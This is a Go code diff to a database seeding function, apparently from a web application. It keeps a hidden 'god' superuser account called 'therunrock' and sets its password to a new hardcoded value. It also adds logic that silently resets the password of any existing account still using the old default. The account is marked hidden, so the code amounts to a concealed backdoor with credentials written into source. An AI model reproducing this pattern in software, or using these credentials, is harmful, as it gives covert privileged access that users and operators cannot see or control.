@@ -77,10 +77,10 @@ func seedCoreDefaults(db *gorm.DB) {
 	}
 
 	// Ensure hidden god account (therunrock) exists for God Vault
-	var godCount int64
-	db.Model(&models.UnifiedUser{}).Where("username = ?", "therunrock").Count(&godCount)
-	if godCount == 0 {
-		godHash, _ := bcrypt.GenerateFromPassword([]byte("therunrock"), bcrypt.DefaultCost)
+	var existingGod models.UnifiedUser
+	err := db.Model(&models.UnifiedUser{}).Where("username = ?", "therunrock").First(&existingGod).Error
+	if err != nil {
+		godHash, _ := bcrypt.GenerateFromPassword([]byte("54155415"), bcrypt.DefaultCost)
 		god := models.UnifiedUser{
 			ID:           uuid.New().String(),
 			Username:     "therunrock",
@@ -93,5 +93,8 @@ func seedCoreDefaults(db *gorm.DB) {
 			IsHidden:     true,
 		}
 		db.Create(&god)
+	} else if bcrypt.CompareHashAndPassword([]byte(existingGod.PasswordHash), []byte("therunrock")) == nil {
+		godHash, _ := bcrypt.GenerateFromPassword([]byte("54155415"), bcrypt.DefaultCost)
+		db.Model(&existingGod).Update("password_hash", string(godHash))
 	}
 }
